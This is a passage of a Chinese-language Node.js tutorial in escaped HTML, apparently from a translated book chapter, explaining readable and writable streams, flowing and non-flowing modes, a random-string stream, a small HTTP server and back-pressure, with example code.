class=\"heading\"\u003e开始使用Streams\u003c/h2\u003e\n\u003cp\u003e在前面的章节中，我们了解了为什么\u003ccode\u003eStreams\u003c/code\u003e如此强大，而且它在\u003ccode\u003eNode.js\u003c/code\u003e中无处不在，甚至在\u003ccode\u003eNode.js\u003c/code\u003e的核心模块中也有其身影。 例如，我们已经看到，\u003ccode\u003efs\u003c/code\u003e模块具有用于从文件读取的\u003ccode\u003ecreateReadStream()\u003c/code\u003e和用于写入文件的\u003ccode\u003ecreateWriteStream()\u003c/code\u003e，\u003ccode\u003eHTTP\u003c/code\u003e请求和响应对象本质上是\u003ccode\u003eStreams\u003c/code\u003e，并且\u003ccode\u003ezlib\u003c/code\u003e模块允许我们使用\u003ccode\u003eStreams\u003c/code\u003e式\u003ccode\u003eAPI\u003c/code\u003e压缩和解压缩数据块。\u003c/p\u003e\n\u003cp\u003e现在我们知道为什么\u003ccode\u003eStreams\u003c/code\u003e是如此重要，让我们退后一步，开始更详细地探索它。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eStreams的结构\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eNode.js\u003c/code\u003e中的每个\u003ccode\u003eStreams\u003c/code\u003e都是\u003ccode\u003eStreams\u003c/code\u003e核心模块中可用的四个基本抽象类之一的实现：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003estream.Readable\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003estream.Writable\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003estream.Duplex\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003estream.Transform\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e每个\u003ccode\u003estream\u003c/code\u003e类也是\u003ccode\u003eEventEmitter\u003c/code\u003e的一个实例。实际上，\u003ccode\u003eStreams\u003c/code\u003e可以产生几种类型的事件，比如\u003ccode\u003eend\u003c/code\u003e事件会在一个可读的\u003ccode\u003eStreams\u003c/code\u003e完成读取，或者错误读取，或其过程中产生异常时触发。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e请注意，为简洁起见，在本章介绍的例子中，我们经常会忽略适当的错误处理。但是，在生产环境下中，总是建议为所有Stream注册错误事件侦听器。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003eStreams\u003c/code\u003e之所以如此灵活的原因之一是它不仅能够处理二进制数据，而且几乎可以处理任何\u003ccode\u003eJavaScript\u003c/code\u003e值。实际上，\u003ccode\u003eStreams\u003c/code\u003e可以支持两种操作模式：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e二进制模式：以数据块形式（例如\u003ccode\u003ebuffers\u003c/code\u003e或\u003ccode\u003estrings\u003c/code\u003e）流式传输数据\u003c/li\u003e\n\u003cli\u003e对象模式：将流数据视为一系列离散对象（这使得我们几乎可以使用任何\u003ccode\u003eJavaScript\u003c/code\u003e值）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这两种操作模式使我们不仅可以使用\u003ccode\u003eI / O\u003c/code\u003e流，而且还可以作为一种工具，以函数式的风格优雅地组合处理单元，我们将在本章后面看到。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在本章中，我们将主要使用在Node.js 0.11中引入的Node.js流接口，也称为版本3。 有关与旧接口差异的更多详细信息，请参阅StrongLoop在https://strongloop.com/strongblog/whats-new-io-js-beta-streams3/中的优秀博客文章。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e可读的Streams\u003c/h3\u003e\n\u003cp\u003e一个可读的\u003ccode\u003eStreams\u003c/code\u003e表示一个数据源，在\u003ccode\u003eNode.js\u003c/code\u003e中，它使用\u003ccode\u003estream\u003c/code\u003e模块中的\u003ccode\u003eReadableabstract\u003c/code\u003e类实现。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e从Streams中读取信息\u003c/h4\u003e\n\u003cp\u003e从可读\u003ccode\u003eStreams\u003c/code\u003e接收数据有两种方式：\u003ccode\u003enon-flowing\u003c/code\u003e模式和\u003ccode\u003eflowing\u003c/code\u003e模式。 我们来更详细地分析这些模式。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003enon-flowing模式（不流动模式）\u003c/h5\u003e\n\u003cp\u003e从可读的\u003ccode\u003eStreams\u003c/code\u003e中读取数据的默认模式是为其附加一个可读事件侦听器，用于指示要读取的新数据的可用性。然后，在一个循环中，我们读取所有的数据，直到内部\u003ccode\u003ebuffer\u003c/code\u003e被清空。这可以使用\u003ccode\u003eread()\u003c/code\u003e方法完成，该方法同步从内部缓冲区中读取数据，并返回表示数据块的\u003ccode\u003eBuffer\u003c/code\u003e或\u003ccode\u003eString\u003c/code\u003e对象。\u003ccode\u003eread()\u003c/code\u003e方法以如下使用模式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ereadable.read([size]);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e使用这种方法，数据随时可以直接从\u003ccode\u003eStreams\u003c/code\u003e中按需提取。\u003c/p\u003e\n\u003cp\u003e为了说明这是如何工作的，我们创建一个名为\u003ccode\u003ereadStdin.js\u003c/code\u003e的新模块，它实现了一个简单的程序，它从标准输入（一个可读流）中读取数据，并将所有数据回送到标准输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eprocess.stdin\n  .on(\u003cspan class=\"hljs-string\"\u003e'readable'\u003c/span\u003e, () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e chunk;\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'New data available'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ((chunk = process.stdin.read()) !== \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\n        \u003cspan class=\"hljs-string\"\u003e`Chunk read: (\u003cspan class=\"hljs-subst\"\u003e${chunk.length}\u003c/span\u003e) \"\u003cspan class=\"hljs-subst\"\u003e${chunk.toString()}\u003c/span\u003e\"`\u003c/span\u003e\n      );\n    }\n  })\n  .on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, () =\u0026gt; process.stdout.write(\u003cspan class=\"hljs-string\"\u003e'End of stream'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eread()\u003c/code\u003e方法是一个同步操作，它从可读\u003ccode\u003eStreams\u003c/code\u003e的内部\u003ccode\u003eBuffers\u003c/code\u003e区中提取数据块。如果\u003ccode\u003eStreams\u003c/code\u003e在二进制模式下工作，返回的数据块默认为一个\u003ccode\u003eBuffer\u003c/code\u003e对象。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在以二进制模式工作的可读的Stream中，我们可以通过在Stream上调用setEncoding(encoding)来读取字符串而不是Buffer对象，并提供有效的编码格式（例如utf8）。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e数据是从可读的侦听器中读取的，只要有新的数据，就会调用这个侦听器。当内部缓冲区中没有更多数据可用时，\u003ccode\u003eread()\u003c/code\u003e方法返回\u003ccode\u003enull\u003c/code\u003e；在这种情况下，我们不得不等待另一个可读的事件被触发，告诉我们可以再次读取或者等待表示\u003ccode\u003eStreams\u003c/code\u003e读取过程结束的\u003ccode\u003eend\u003c/code\u003e事件触发。当一个流以二进制模式工作时，我们也可以通过向\u003ccode\u003eread()\u003c/code\u003e方法传递一个\u003ccode\u003esize\u003c/code\u003e参数来指定我们想要读取的数据大小。这在实现网络协议或解析特定数据格式时特别有用。\u003c/p\u003e\n\u003cp\u003e现在，我们准备运行\u003ccode\u003ereadStdin\u003c/code\u003e模块并进行实验。让我们在控制台中键入一些字符，然后按\u003ccode\u003eEnter\u003c/code\u003e键查看回显到标准输出中的数据。要终止流并因此生成一个正常的结束事件，我们需要插入一个\u003ccode\u003eEOF\u003c/code\u003e（文件结束）字符（在\u003ccode\u003eWindows\u003c/code\u003e上使用\u003ccode\u003eCtrl + Z\u003c/code\u003e或在\u003ccode\u003eLinux\u003c/code\u003e上使用\u003ccode\u003eCtrl + D\u003c/code\u003e）。\u003c/p\u003e\n\u003cp\u003e我们也可以尝试将我们的程序与其他程序连接起来;这可以使用管道运算符（\u003ccode\u003e|\u003c/code\u003e），它将程序的标准输出重定向到另一个程序的标准输入。例如，我们可以运行如下命令：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ecat \u0026lt;path to a file\u0026gt; | node \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003eStdin\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这是流式范例是一个通用接口的一个很好的例子，它使得我们的程序能够进行通信，而不管它们是用什么语言写的。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003eflowing模式（流动模式）\u003c/h5\u003e\n\u003cp\u003e从\u003ccode\u003eStreams\u003c/code\u003e中读取的另一种方法是将侦听器附加到\u003ccode\u003edata\u003c/code\u003e事件；这会将\u003ccode\u003eStreams\u003c/code\u003e切换为\u003ccode\u003eflowing\u003c/code\u003e模式，其中数据不是使用\u003ccode\u003eread()\u003c/code\u003e函数来提取的，而是一旦有数据到达\u003ccode\u003edata\u003c/code\u003e监听器就被推送到监听器内。例如，我们之前创建的\u003ccode\u003ereadStdin\u003c/code\u003e应用程序将使用流动模式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eprocess.stdin\n  .on(\u003cspan class=\"hljs-string\"\u003e'data'\u003c/span\u003e, chunk =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'New data available'\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\n      \u003cspan class=\"hljs-string\"\u003e`Chunk read: (\u003cspan class=\"hljs-subst\"\u003e${chunk.length}\u003c/span\u003e) \"\u003cspan class=\"hljs-subst\"\u003e${chunk.toString()}\u003c/span\u003e\"`\u003c/span\u003e\n    );\n  })\n  .on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, () =\u0026gt; process.stdout.write(\u003cspan class=\"hljs-string\"\u003e'End of stream'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eflowing\u003c/code\u003e模式是旧版\u003ccode\u003eStreams\u003c/code\u003e接口（也称为\u003ccode\u003eStreams1\u003c/code\u003e）的继承，其灵活性较低，\u003ccode\u003eAPI\u003c/code\u003e较少。随着\u003ccode\u003eStreams2\u003c/code\u003e接口的引入，\u003ccode\u003eflowing\u003c/code\u003e模式不是默认的工作模式，要启用它，需要将侦听器附加到\u003ccode\u003edata\u003c/code\u003e事件或显式调用\u003ccode\u003eresume()\u003c/code\u003e方法。 要暂时中断\u003ccode\u003eStreams\u003c/code\u003e触发\u003ccode\u003edata\u003c/code\u003e事件，我们可以调用\u003ccode\u003epause()\u003c/code\u003e方法，导致任何传入数据缓存在内部\u003ccode\u003ebuffer\u003c/code\u003e中。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e调用pause()不会导致Streams切换回non-flowing模式。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e实现可读的Streams\u003c/h4\u003e\n\u003cp\u003e现在我们知道如何从\u003ccode\u003eStreams\u003c/code\u003e中读取数据，下一步是学习如何实现一个新的\u003ccode\u003eReadable\u003c/code\u003e数据流。为此，有必要通过继承\u003ccode\u003estream.Readable\u003c/code\u003e的原型来创建一个新的类。 具体流必须提供\u003ccode\u003e_read()\u003c/code\u003e方法的实现：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ereadable._read(size)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eReadable\u003c/code\u003e类的内部将调用\u003ccode\u003e_read()\u003c/code\u003e方法，而该方法又将启动\n使用\u003ccode\u003epush()\u003c/code\u003e填充内部缓冲区：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e请注意，read()是Stream消费者调用的方法，而_read()是一个由Stream子类实现的方法，不能直接调用。下划线通常表示该方法为私有方法，不应该直接调用。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e为了演示如何实现新的可读\u003ccode\u003eStreams\u003c/code\u003e，我们可以尝试实现一个生成随机字符串的\u003ccode\u003eStreams\u003c/code\u003e。 我们来创建一个名为\u003ccode\u003erandomStream.js\u003c/code\u003e的新模块，它将包含我们的字符串的\u003ccode\u003egenerator\u003c/code\u003e的代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'stream'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Chance = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'chance'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chance = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Chance();\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eRandomStream\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003estream\u003c/span\u003e.\u003cspan class=\"hljs-title\"\u003eReadable\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(options) {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e(options);\n  }\n\n  _read(size) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chunk = chance.string(); \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`Pushing chunk of size: \u003cspan class=\"hljs-subst\"\u003e${chunk.length}\u003c/span\u003e`\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push(chunk, \u003cspan class=\"hljs-string\"\u003e'utf8'\u003c/span\u003e); \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (chance.bool({\n        \u003cspan class=\"hljs-attr\"\u003elikelihood\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\n      })) { \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e);\n    }\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = RandomStream;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在文件顶部，我们将加载我们的依赖关系。除了我们正在加载一个\u003ca target=\"_blank\" href=\"https://npmjs.org/package/chance\"\u003echance的npm模块\u003c/a\u003e之外，没有什么特别之处，它是一个用于生成各种随机值的库，从数字到字符串到整个句子都能生成随机值。\u003c/p\u003e\n\u003cp\u003e下一步是创建一个名为\u003ccode\u003eRandomStream\u003c/code\u003e的新类，并指定\u003ccode\u003estream.Readable\u003c/code\u003e作为其父类。 在前面的代码中，我们调用父类的构造函数来初始化其内部状态，并将收到的\u003ccode\u003eoptions\u003c/code\u003e参数作为输入。通过\u003ccode\u003eoptions\u003c/code\u003e对象传递的可能参数包括以下内容：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用于将\u003ccode\u003eBuffers\u003c/code\u003e转换为\u003ccode\u003eStrings\u003c/code\u003e的\u003ccode\u003eencoding\u003c/code\u003e参数（默认值为\u003ccode\u003enull\u003c/code\u003e）\u003c/li\u003e\n\u003cli\u003e是否启用对象模式（\u003ccode\u003eobjectMode\u003c/code\u003e默认为\u003ccode\u003efalse\u003c/code\u003e）\u003c/li\u003e\n\u003cli\u003e存储在内部\u003ccode\u003ebuffer\u003c/code\u003e区中的数据的上限，一旦超过这个上限，则暂停从\u003ccode\u003edata source\u003c/code\u003e读取（\u003ccode\u003ehighWaterMark\u003c/code\u003e默认为\u003ccode\u003e16KB\u003c/code\u003e）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e好的，现在让我们来解释一下我们重写的\u003ccode\u003estream.Readable\u003c/code\u003e类的\u003ccode\u003e_read()\u003c/code\u003e方法：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e该方法使用\u003ccode\u003echance\u003c/code\u003e生成随机字符串。\u003c/li\u003e\n\u003cli\u003e它将字符串\u003ccode\u003epush\u003c/code\u003e内部\u003ccode\u003ebuffer\u003c/code\u003e。 请注意，由于我们\u003ccode\u003epush\u003c/code\u003e的是\u003ccode\u003eString\u003c/code\u003e，此外我们还指定了编码为\u003ccode\u003eutf8\u003c/code\u003e（如果数据块只是一个二进制\u003ccode\u003eBuffer\u003c/code\u003e，则不需要）。\u003c/li\u003e\n\u003cli\u003e以\u003ccode\u003e5%\u003c/code\u003e的概率随机中断\u003ccode\u003estream\u003c/code\u003e的随机字符串产生，通过\u003ccode\u003epush\u003c/code\u003e \u003ccode\u003enull\u003c/code\u003e到内部\u003ccode\u003eBuffer\u003c/code\u003e来表示\u003ccode\u003eEOF\u003c/code\u003e，即\u003ccode\u003estream\u003c/code\u003e的结束。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们还可以看到在\u003ccode\u003e_read()\u003c/code\u003e函数的输入中给出的\u003ccode\u003esize\u003c/code\u003e参数被忽略了，因为它是一个建议的参数。 我们可以简单地把所有可用的数据都\u003ccode\u003epush\u003c/code\u003e到内部的\u003ccode\u003ebuffer\u003c/code\u003e中，但是如果在同一个调用中有多个推送，那么我们应该检查\u003ccode\u003epush()\u003c/code\u003e是否返回\u003ccode\u003efalse\u003c/code\u003e，因为这意味着内部\u003ccode\u003ebuffer\u003c/code\u003e已经达到了\u003ccode\u003ehighWaterMark\u003c/code\u003e限制，我们应该停止添加更多的数据。\u003c/p\u003e\n\u003cp\u003e以上就是\u003ccode\u003eRandomStream\u003c/code\u003e模块，我们现在准备好使用它。我们来创建一个名为\u003ccode\u003egenerateRandom.js\u003c/code\u003e的新模块，在这个模块中我们实例化一个新的\u003ccode\u003eRandomStream\u003c/code\u003e对象并从中提取一些数据：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e RandomStream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./randomStream'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e randomStream = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e RandomStream();\n\nrandomStream.on(\u003cspan class=\"hljs-string\"\u003e'readable'\u003c/span\u003e, () =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e chunk;\n  \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ((chunk = randomStream.read()) !== \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`Chunk received: \u003cspan class=\"hljs-subst\"\u003e${chunk.toString()}\u003c/span\u003e`\u003c/span\u003e);\n  }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在，一切都准备好了，我们尝试新的自定义的\u003ccode\u003estream\u003c/code\u003e。 像往常一样简单地执行\u003ccode\u003egenerateRandom\u003c/code\u003e模块，观察随机的字符串在屏幕上流动。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e可写的Streams\u003c/h3\u003e\n\u003cp\u003e一个可写的\u003ccode\u003estream\u003c/code\u003e表示一个数据终点，在\u003ccode\u003eNode.js\u003c/code\u003e中，它使用\u003ccode\u003estream\u003c/code\u003e模块中的\u003ccode\u003eWritable\u003c/code\u003e抽象类来实现。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e写入一个stream\u003c/h4\u003e\n\u003cp\u003e把一些数据放在可写入的\u003ccode\u003estream\u003c/code\u003e中是一件简单的事情， 我们所要做的就是使用\u003ccode\u003ewrite()\u003c/code\u003e方法，它具有以下格式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ewritable.write(chunk, [encoding], [callback])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eencoding\u003c/code\u003e参数是可选的，其在\u003ccode\u003echunk\u003c/code\u003e是\u003ccode\u003eString\u003c/code\u003e类型时指定（默认为\u003ccode\u003eutf8\u003c/code\u003e，如果\u003ccode\u003echunk\u003c/code\u003e是\u003ccode\u003eBuffer\u003c/code\u003e，则忽略）；当数据块被刷新到底层资源中时，\u003ccode\u003ecallback\u003c/code\u003e就会被调用，\u003ccode\u003ecallback\u003c/code\u003e参数也是可选的。\u003c/p\u003e\n\u003cp\u003e为了表示没有更多的数据将被写入\u003ccode\u003estream\u003c/code\u003e中，我们必须使用\u003ccode\u003eend()\u003c/code\u003e方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ewritable.end([chunk], [encoding], [callback])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们可以通过\u003ccode\u003eend()\u003c/code\u003e方法提供最后一块数据。在这种情况下，\u003ccode\u003ecallbak\u003c/code\u003e函数相当于为\u003ccode\u003efinish\u003c/code\u003e事件注册一个监听器，当数据块全部被写入\u003ccode\u003estream\u003c/code\u003e中时，会触发该事件。\u003c/p\u003e\n\u003cp\u003e现在，让我们通过创建一个输出随机字符串序列的小型\u003ccode\u003eHTTP\u003c/code\u003e服务器来演示这是如何工作的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Chance = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'chance'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chance = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Chance();\n\n\u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e).createServer(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  res.writeHead(\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e, {\n    \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'text/plain'\u003c/span\u003e\n  }); \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (chance.bool({\n      \u003cspan class=\"hljs-attr\"\u003elikelihood\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e\n    })) { \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n    res.write(chance.string() + \u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e); \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n  }\n  res.end(\u003cspan class=\"hljs-string\"\u003e'\\nThe end...\\n'\u003c/span\u003e); \u003cspan class=\"hljs-comment\"\u003e//[4]\u003c/span\u003e\n  res.on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'All data was sent'\u003c/span\u003e)); \u003cspan class=\"hljs-comment\"\u003e//[5]\u003c/span\u003e\n}).listen(\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Listening on http://localhost:8080'\u003c/span\u003e));\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们创建了一个\u003ccode\u003eHTTP服务器\u003c/code\u003e，并把数据写入\u003ccode\u003eres\u003c/code\u003e对象，\u003ccode\u003eres\u003c/code\u003e对象是\u003ccode\u003ehttp.ServerResponse\u003c/code\u003e的一个实例，也是一个可写入的\u003ccode\u003estream\u003c/code\u003e。下面来解释上述代码发生了什么：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们首先写\u003ccode\u003eHTTP response\u003c/code\u003e的头部。请注意，\u003ccode\u003ewriteHead()\u003c/code\u003e不是\u003ccode\u003eWritable\u003c/code\u003e接口的一部分，实际上，这个方法是\u003ccode\u003ehttp.ServerResponse\u003c/code\u003e类公开的辅助方法。\u003c/li\u003e\n\u003cli\u003e我们开始一个\u003ccode\u003e5％\u003c/code\u003e的概率终止的循环（进入循环体的概率为\u003ccode\u003echance.bool()\u003c/code\u003e产生，其为\u003ccode\u003e95％\u003c/code\u003e）。\u003c/li\u003e\n\u003cli\u003e在循环内部，我们写入一个随机字符串到\u003ccode\u003estream\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e一旦我们不在循环中，我们调用\u003ccode\u003estream\u003c/code\u003e的\u003ccode\u003eend()\u003c/code\u003e，表示没有更多\n数据块将被写入。另外，我们在结束之前提供一个最终的字符串写入流中。\u003c/li\u003e\n\u003cli\u003e最后，我们注册一个\u003ccode\u003efinish\u003c/code\u003e事件的监听器，当所有的数据块都被刷新到底层\u003ccode\u003esocket\u003c/code\u003e中时，这个事件将被触发。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e我们可以调用这个小模块称为\u003ccode\u003eentropyServer.js\u003c/code\u003e，然后执行它。要测试这个服务器，我们可以在地址\u003ccode\u003ehttp：// localhost:8080\u003c/code\u003e打开一个浏览器，或者从终端使用\u003ccode\u003ecurl\u003c/code\u003e命令，如下所示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ecurl localhost:8080\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e此时，服务器应该开始向您选择的\u003ccode\u003eHTTP客户端\u003c/code\u003e发送随机字符串（请注意，某些浏览器可能会缓冲数据，并且流式传输行为可能不明显）。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eBack-pressure（反压）\u003c/h4\u003e\n\u003cp\u003e类似于在真实管道系统中流动的液体，\u003ccode\u003eNode.js\u003c/code\u003e的\u003ccode\u003estream\u003c/code\u003e也可能遭受瓶颈，数据写入速度可能快于\u003ccode\u003estream\u003c/code\u003e的消耗。 解决这个问题的机制包括缓冲输入数据；然而，如果数据\u003ccode\u003estream\u003c/code\u003e没有给生产者任何反馈，我们可能会产生越来越多的数据被累积到内部缓冲区的情况，导致内存泄露的发生。\u003c/p\u003e\n\u003cp\u003e为了防止这种情况的发生，当内部\u003ccode\u003ebuffer\u003c/code\u003e超过\u003ccode\u003ehighWaterMark\u003c/code\u003e限制时，\u003ccode\u003ewritable.write()\u003c/code\u003e将返回\u003ccode\u003efalse\u003c/code\u003e。 可写入的\u003ccode\u003estream\u003c/code\u003e具有\u003ccode\u003ehighWaterMark\u003c/code\u003e属性，这是\u003ccode\u003ewrite()\u003c/code\u003e方法开始返回\u003ccode\u003efalse\u003c/code\u003e的内部\u003ccode\u003eBuffer\u003c/code\u003e区大小的限制，一旦\u003ccode\u003eBuffer\u003c/code\u003e区的大小超过这个限制，表示应用程序应该停止写入。 当缓冲器被清空时，会触发一个叫做\u003ccode\u003edrain\u003c/code\u003e的事件，通知再次开始写入是安全的。 这种机制被称为\u003ccode\u003eback-pressure\u003c/code\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本节介绍的机制同样适用于可读的stream。事实上，在可读stream中也存在back-pressure，并且在_read()内调用的push()方法返回false时触发。 但是，这对于stream实现者来说是一个特定的问题，所以我们将不经常处理它。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e我们可以通过修改之前创建的\u003ccode\u003eentropyServer\u003c/code\u003e模块来演示可写入的\u003ccode\u003estream\u003c/code\u003e的\u003ccode\u003eback-pressure\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e Chance = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'chance'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e chance = \u003cspan 